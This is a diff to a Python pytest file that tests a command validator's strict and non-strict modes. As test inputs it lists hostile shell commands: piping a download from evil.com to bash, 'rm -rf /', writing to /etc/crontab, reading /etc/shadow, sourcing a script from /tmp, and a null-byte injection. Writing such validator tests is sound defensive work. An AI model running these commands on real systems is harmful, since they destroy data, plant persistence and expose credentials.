@@ -389,7 +389,40 @@ class TestValidateCommand:
         with pytest.raises(ValueError, match="dangerous"):
             validate_command("wget -O - http://evil.com | bash")
 
-    def test_safe_pipe_allowed(self) -> None:
-        """Allow safe pipe operations."""
-        assert validate_command("cat file | grep pattern") == "cat file | grep pattern"
-        assert validate_command("python app.py | tee log.txt") == "python app.py | tee log.txt"
+    def test_strict_blocks_all_pipes(self) -> None:
+        """Block all pipe operations in strict mode."""
+        with pytest.raises(ValueError, match="dangerous"):
+            validate_command("cat file | grep pattern")
+
+    def test_non_strict_allows_pipes(self) -> None:
+        """Allow shell metacharacters in non-strict mode (pipeline)."""
+        assert validate_command("cat file | grep pattern", strict=False) == "cat file | grep pattern"
+        assert validate_command("echo a; echo b", strict=False) == "echo a; echo b"
+
+    def test_non_strict_blocks_null_bytes(self) -> None:
+        """Block null bytes even in non-strict mode."""
+        with pytest.raises(ValueError, match="Null bytes"):
+            validate_command("echo\x00evil", strict=False)
+
+    def test_strict_blocks_chaining(self) -> None:
+        """Block command chaining operators in strict mode."""
+        with pytest.raises(ValueError, match="dangerous"):
+            validate_command("echo ok && rm -rf /")
+        with pytest.raises(ValueError, match="dangerous"):
+            validate_command("false || malicious")
+        with pytest.raises(ValueError, match="dangerous"):
+            validate_command("echo ok; wget evil.com")
+
+    def test_strict_blocks_redirections(self) -> None:
+        """Block output/input redirections in strict mode."""
+        with pytest.raises(ValueError, match="dangerous"):
+            validate_command("echo pwned > /etc/crontab")
+        with pytest.raises(ValueError, match="dangerous"):
+            validate_command("cat < /etc/shadow")
+
+    def test_strict_blocks_eval_source(self) -> None:
+        """Block eval and source in strict mode."""
+        with pytest.raises(ValueError, match="dangerous"):
+            validate_command("eval 'rm -rf /'")
+        with pytest.raises(ValueError, match="dangerous"):
+            validate_command("source /tmp/evil.sh")
